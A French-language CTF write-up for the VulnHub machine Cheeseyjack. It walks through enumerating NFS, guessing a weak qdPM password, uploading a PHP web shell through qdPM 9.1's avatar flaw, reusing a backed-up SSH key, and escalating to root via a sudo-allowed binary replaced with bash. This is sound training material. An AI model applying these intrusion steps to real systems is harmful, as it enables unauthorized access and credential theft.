# Solution du CTF Cheeseyjack de VulnHub

High Jack
---------

[Cheeseyjack](https://www.vulnhub.com/entry/cheesey-cheeseyjack,578/) est décrit par son créateur comme un CTF réaliste de difficulté facile à moyenne et que tout devrait normalement paraître logique. Une belle promesse pour dire qu'on ne devrait pas subir de guessing.  

On a aussi ce conseil si jamais on est bloqué : *A cewl tool can help you get past a login page*.  

```plain
$ sudo nmap -T5 -p- -sCV 192.168.56.3 
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for 192.168.56.3 
Host is up (0.00016s latency). 
Not shown: 65524 closed tcp ports (reset) 
PORT      STATE SERVICE     VERSION 
22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 
| ssh-hostkey:  
|   3072 96:84:24:c8:07:d0:ec:63:51:e0:af:28:ef:62:df:af (RSA) 
|   256 7b:2b:f8:33:9b:af:9a:05:e8:a3:14:ec:a9:f7:c1:6f (ECDSA) 
|_  256 9d:0e:35:9c:6a:ef:2f:85:c0:aa:65:de:07:25:74:7f (ED25519) 
80/tcp    open  http        Apache httpd 2.4.41 ((Ubuntu)) 
|_http-server-header: Apache/2.4.41 (Ubuntu) 
|_http-title: WeBuild - Bootstrap Coming Soon Template 
111/tcp   open  rpcbind     2-4 (RPC #100000) 
| rpcinfo:  
|   program version    port/proto  service 
|   100000  2,3,4        111/tcp   rpcbind 
|   100000  2,3,4        111/udp   rpcbind 
|   100000  3,4          111/tcp6  rpcbind 
|   100000  3,4          111/udp6  rpcbind 
|   100003  3           2049/udp   nfs 
|   100003  3           2049/udp6  nfs 
|   100003  3,4         2049/tcp   nfs 
|   100003  3,4         2049/tcp6  nfs 
|   100005  1,2,3      43179/tcp   mountd 
|   100005  1,2,3      52459/tcp6  mountd 
|   100005  1,2,3      56062/udp6  mountd 
|   100005  1,2,3      56612/udp   mountd 
|   100021  1,3,4      33463/tcp6  nlockmgr 
|   100021  1,3,4      34047/udp6  nlockmgr 
|   100021  1,3,4      35219/tcp   nlockmgr 
|   100021  1,3,4      47589/udp   nlockmgr 
|   100227  3           2049/tcp   nfs_acl 
|   100227  3           2049/tcp6  nfs_acl 
|   100227  3           2049/udp   nfs_acl 
|_  100227  3           2049/udp6  nfs_acl 
139/tcp   open  netbios-ssn Samba smbd 4.6.2 
445/tcp   open  netbios-ssn Samba smbd 4.6.2 
2049/tcp  open  nfs_acl     3 (RPC #100227) 
33060/tcp open  mysqlx? 
| fingerprint-strings:  
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:  
|     Invalid message" 
|_    HY000 
35219/tcp open  nlockmgr    1-4 (RPC #100021) 
37491/tcp open  mountd      1-3 (RPC #100005) 
43179/tcp open  mountd      1-3 (RPC #100005) 
46813/tcp open  mountd      1-3 (RPC #100005) 
```

On a beaucoup de ports liés aux services RPC. Evidemment seul NFS semble intéressant dans le lot. Testé via *smbclient*, Samba ne semble pas partager de disques.  

Il est temps de jeter un œil plus curieux sur les partages NFS :  

```plain
$ showmount -e 192.168.56.3 
Export list for 192.168.56.3: 
/home/ch33s3m4n *
```

On a donc cet utilisateur qui dispose de son dossier personnel en partage. On peut le monter simplement :  

```bash
$ sudo mount 192.168.56.3:/home/ch33s3m4n /mnt/
```

On est bien sûr tenté d'en profiter en rajoutant notre clé publique SSH dans les clés autorisées pour l'utilisateur :  

```plain
cp ~/.ssh/id_rsa.pub /mnt/.ssh/authorized_keys 
cp: impossible de créer le fichier standard '/mnt/.ssh/authorized_keys': Système de fichiers accessible en lecture seulement
```

Raté... En fouillant dans les fichiers on ne remarque rien de vraiment critique. Dans le dossier *Downloads* se trouve une archive *qdPM\_9.1.zip* qui est [une webapp de gestion de projet](https://qdpm.net/).  

Étrangement il y a un dossier *.mozilla* avec les données de navigation de Firefox. Je les copie donc et tente d'extraire les potentiels mots de passes enregistrés avec [firefox\_decrypt](https://github.com/devl00p/firefox_decrypt) (j'ai forké le projet car le mainteneur ne souhaite pas maintenir une compatibilité avec les versions moins récentes de Python 3).  

```plain
$ python3 firefox_decrypt.py /tmp/mozilla_dir/firefox/ 
Select the Mozilla profile you wish to decrypt 
1 -> q525c4g9.default 
2 -> o73rg01h.default-release 
2 
ERROR - Couldn't find credentials file (logins.json or signons.sqlite).
```

Rien d'intéressant n'a été enregistré. On peut fouiller dans l'historique des pages navigués manuellement :  

```plain
$ sqlite3 places.sqlite 
SQLite version 3.36.0 2021-06-18 18:36:39 
Enter ".help" for usage hints. 
sqlite> .tables 
moz_anno_attributes    moz_historyvisits      moz_meta              
moz_annos              moz_inputhistory       moz_origins           
moz_bookmarks          moz_items_annos        moz_places            
moz_bookmarks_deleted  moz_keywords          
sqlite> select * from moz_places; 
1|https://www.mozilla.org/privacy/firefox/||gro.allizom.www.|1|1|0|24|1600975966324579|XC9s1KVMa_Yx|0|47356411089529|||1 
--- snip ---
12|https://sourceforge.net/projects/qdpm/files/latest/download|Download qdPM - Web-Based Project Management Tool from SourceForge.net|ten.egrofecruos.|1|0|1|1950|1600976867874580|ZWK91gbmcYzY|0|47357408577348|q
dPM is a free web-based project management tool suitable for a small team working on multiple projects. It is fully configurable. You can easy…||7 
13|https://downloads.sourceforge.net/project/qdpm/qdPM_9.1.zip?r=&ts=1600976867&use_mirror=managedway||ten.egrofecruos.sdaolnwod.|1|1|0|24|1600976874201416|Aya03IFXdkdW|0|47359131044409|||8 
14|https://managedway.dl.sourceforge.net/project/qdpm/qdPM_9.1.zip|qdPM_9.1.zip|ten.egrofecruos.ld.yawdeganam.|0|0|0|0|1600976913927000|ZB3oiXT0rof4|0|47358794612246|||9 
15|https://sourceforge.net/projects/qdpm/postdownload|Find out more about qdPM - Web-Based Project Management Tool | SourceForge.net|ten.egrofecruos.|1|0|0|98|1600976914716043|GLp-RTeSOoZv|0|47358977842325|qdPM
 is a free web-based project management tool suitable for a small team working on multiple projects. It is fully configurable. You can easy…||7 
16|https://sourceforge.net/projects/qdpm/|qdPM - Web-Based Project Management Tool download | SourceForge.net|ten.egrofecruos.|1|0|0|98|1600976955818223|8bYjfLGzMCEp|0|47357934357261|Download qdPM - Web-Based P
roject Management Tool for free.  qdPM is a free web-based project management tool suitable for a small team working on multiple projects. It is fully configurable.|https://a.fsdn.com/allura/p/qdpm/icon?1534811
126|7
```

Finalement on est pas plus avancés...  

Car Jack
--------

La page d'index du site ne donnant rien de probant, je trouve via Feroxbuster le dossier */forms/* avec deux scripts PHP, chacun donne une erreur *Unable to load the "PHP Email Form" Library!*. Cassés donc.  

Comme un nom d'hôte apparaissant dans le code HTML (*cheeseyjack.local*) j'ai tenté d'énumérer les hôtes virtuels, là encore sans succès :  

```bash
$ ffuf -w /fuzzdb/discovery/dns/alexaTop1mAXFRcommonSubdomains.txt -u http://192.168.56.3/ -H "Host: FUZZ.cheeseyjack.local"  -fs 7247
```

Finalement en utilisant la wordlist *directory-list-2.3-big.txt* (que vous trouverez facilement sur Github) je trouve déjà ce fichier */it\_security/note.txt* :  

> Cheese you complete idiot. You hired me to ensure your webapp project stayed secure and you use a weak password like that?  
> 
> What's wrong with you? A baby could guess that!  
> 
>   
> 
>  -crab

Ainsi qu'un dossier */project\_management* qui semble être une installation de *qdPM* mentionné plus tôt.  

Avec la note précédente on va donc tenter de trouver un compte valide pour le webapp. J'ai été un peu trompé par l'indice indiquant d'utiliser [Cewl](https://github.com/digininja/cewl) qui ne m'a mené à rien.  

L'appli demande un email pour nom d'utilisateur donc certainement *cheese@cheeseyjack.local* ou *ch33s3m4n@cheeseyjack.local* (rapport au nom d'utilisateur Unix).  

Avec le dernier et le mot de passe *qdpm* je parvient finalement à me connecter sur l'application.  

Lumber Jack
-----------

Sur [exploit-db](https://www.exploit-db.com/exploits/48460) on trouve la description d'une vulnérabilité pour *qdPM 9.1*. Il n'y a pas de code d'exploitation et pour cause, il suffit d'uploader un script PHP une fois authentifié en abusant la fonctionnalité de sélection d'un avatar qui ne vérifie pas les extensions de fichier.  

Une fois mon shell PHP uploadé un petit click droit me permet de retrouver son emplacement : */project\_management/uploads/users/179373-shell.php*  

Je remarque deux utilisateurs non privilégiés sur le système :  

```plain
ch33s3m4n:x:1000:1000:ch33s3m4n,,,:/home/ch33s3m4n:/bin/bash 
crab:x:1001:1001::/home/crab:/bin/bash
```

Le dernier dispose d'une TODO list intéressante :  

```plain
www-data@cheeseyjack:/var/www/html/project_management/uploads/users$ cat /home/crab/todo.txt  
1. Scold cheese for weak qdpm password (done) 
2. Backup SSH keys to /var/backups 
3. Change cheese's weak password 
4. Milk 
5. Eggs 
6. Stop putting my grocery list on my todo lists
```

Il y a en effet un fichier *key.bak* dans */var/backups*  qui correspond à la clé privée de cet utilisateur. Abusons en !  

Une fois connecté on remarque que l'utilisateur a des droits sudo pour un dossier sur lequel on a le contrôle :  

```plain
crab@cheeseyjack:~$ sudo -l 
Matching Defaults entries for crab on cheeseyjack: 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 

User crab may run the following commands on cheeseyjack: 
    (ALL : ALL) ALL 
    (root) NOPASSWD: /home/crab/.bin/

crab@cheeseyjack:~$ ls -l /home/crab/.bin/ping 
-rwxr-xr-x 1 crab crab 72776 Sep 24  2020 /home/crab/.bin/ping
crab@cheeseyjack:~$ cp /bin/bash /home/crab/.bin/ping 
crab@cheeseyjack:~$ sudo /home/crab/.bin/ping -p 
root@cheeseyjack:/home/crab# id 
uid=0(root) gid=0(root) groups=0(root) 
root@cheeseyjack:/home/crab# cd /root 
root@cheeseyjack:~# ls 
root.txt 
root@cheeseyjack:~# cat root.txt  
                    ___ _____ 
                   /\ (_)    \ 
                  /  \      (_, 
                 _)  _\   _    \ 
                /   (_)\_( )____\ 
                \_     /    _  _/ 
                  ) /\/  _ (o)( 
                  \ \_) (o)   / 
                   \/________/     

WOWWEEEE! You rooted my box! Congratulations. If you enjoyed this box there will be more coming. 

Tag me on twitter @cheesewadd with this picture and i'll give you a RT!
```


*Published January 18 2022 at 13:29*